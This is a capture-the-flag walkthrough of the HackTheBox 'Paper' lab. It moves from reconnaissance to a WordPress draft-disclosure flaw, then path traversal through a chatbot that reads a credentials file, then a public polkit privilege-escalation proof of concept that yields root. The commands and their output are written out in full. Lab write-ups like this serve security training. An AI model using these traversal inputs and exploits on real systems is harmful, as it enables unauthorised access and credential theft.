# Paper

Paper is a easy HTB lab that focuses on directory traversal, sensitive information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV -sC 10.129.38.169

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-14 04:08 GMT
Nmap scan report for 10.129.38.169
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| tls-alpn:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.20 seconds
```

Enumerating the files and directories in the website:
```
$ feroxbuster -u https://10.129.38.169/ -A -k -d 4 --filter-status 404 --smart --output web.txt -w /usr/share/wordlists/dirb/common.txt
$ feroxbuster -u https://10.129.38.169/ -A -k -d 4 --filter-status 404 --smart --output web2.txt -w /usr/share/wordlists/dirb/big.txt --dont-scan https://10.129.38.169/manual/ --dont-scan https://10.129.38.169/icons/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.38.169/
 🚫  Don't Scan Url        │ https://10.129.38.169/manual
 🚫  Don't Scan Url        │ https://10.129.38.169/icons
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ web2.txt
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       27l      138w    10208c https://10.129.38.169/poweredby.png
403      GET       70l     2438w   199691c https://10.129.38.169/
[####################] - 8s     40950/40950   0s      found:2       errors:0
[####################] - 6s     20469/20469   3108/s  https://10.129.38.169/
[####################] - 6s     20469/20469   3184/s  https://10.129.38.169/cgi-bin/
```

Getting some header information if we can access `http` port:
```
$ curl -I http://10.129.38.169/ -k
HTTP/1.1 403 Forbidden
Date: Sun, 14 Jan 2024 06:09:35 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

Adding new domains found to `/etc/hosts` from the `X-Backend-Server` header in response.
```
sudo tee --append /etc/hosts <<< "10.129.38.169 office.paper"
```

Enumerating the new website:
```
$ feroxbuster -u http://office.paper/ -A -k -d 4 --filter-status 404 --smart --output web_paper.txt -w /usr/share/wordlists/dirb/common.txt --dont-scan http://office.paper/manual/

http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2Fadmin.php&reauth=1
[####################] - 1s      4619/4614    2615/s  http://office.paper/
[####################] - 1s      4683/4683    2349/s  http://office.paper/cgi-bin/
[###>----------------] - 2m       803/4614    6/s     http://office.paper/index.php/comments/feed/
[####################] - 21s     4683/4683    252/s   http://office.paper/wp-admin/
[####################] - 20s     4683/4683    261/s   http://office.paper/wp-content/
[####################] - 21s     4683/4683    246/s   http://office.paper/wp-includes/
  4: Pages similar to: http://office.paper/c3c9cc8a1288425987463daf8a29d323
  5: Pages similar to: http://office.paper/.htaccessd04b93346d4f4fe1a00d8c72ed1252d6
  6: GET requests with 404 responses containing 18985 bytes, 882 words, and 199 lines
  7: Pages similar to: http://office.paper/index.php/comments/feed/4f4e57c94487424b8c211c4777ca1b11
```

### Attack

Opening the website `http://office.paper/`, gives us the following information:
* Only author - http://office.paper/index.php/author/prisonmike/
* There is some secret information in drafts.
```
Feeling Alone!

I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.

So, other employees who were added to this blog are now removed.

As of now there is only one user in this blog. Which is me! Just me.

Previous Article
One thought on “Feeling Alone!”
nick
June 20, 2021 at 2:49 pm

Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
```

Searching online for drafts exploit (CVE-2019-17671) - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2/
Based on that we got the following information from `http://office.paper/?static=1`.

```
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

### User

Using this, we added new subdomain to `/etc/hosts`. After login, we can see the `general` group chat. We got following information:
* Bot - Just call the bot by his name and say help. His name is recyclops. For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him.
* Group is read only but direct message to `recyclops` is possible.

Executing following commands to enumerate the machine:
```
recyclops time
recyclops list /
recyclops file /sale/portfolio.txt
recyclops list /../
# dwight user
recyclops file /../.hubot_history
recyclops list /../hubot/
recyclops file /../hubot/.env
 <!=====Contents of file /../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queen***********
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

Getting the user flag:
```
$ ssh dwight@office.paper
dwight@office.paper's password: Queen***********
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Getting the `sudo` version.
```
$ sudo -V
Sudo version 1.8.29
Sudoers policy plugin version 1.8.29
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.29
```

Using `linpeas.sh`, we can find that machine is vulnerable to `CVE-2021-3560` and for that we can use this POC -https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh.

```
$ sh poc.sh -u='sec' -p=sec

[!] Username set as : sec
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username sec...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username sec  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - sec
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

Gaining the root shell with the new credentials:
```
[dwight@paper ~]$ su - sec
Password:
[sec@paper ~]$ sudo bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for sec:
[root@paper sec]# id
uid=0(root) gid=0(root) groups=0(root)
```

Getting the flag:
```
[root@paper sec]# cat /root/root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
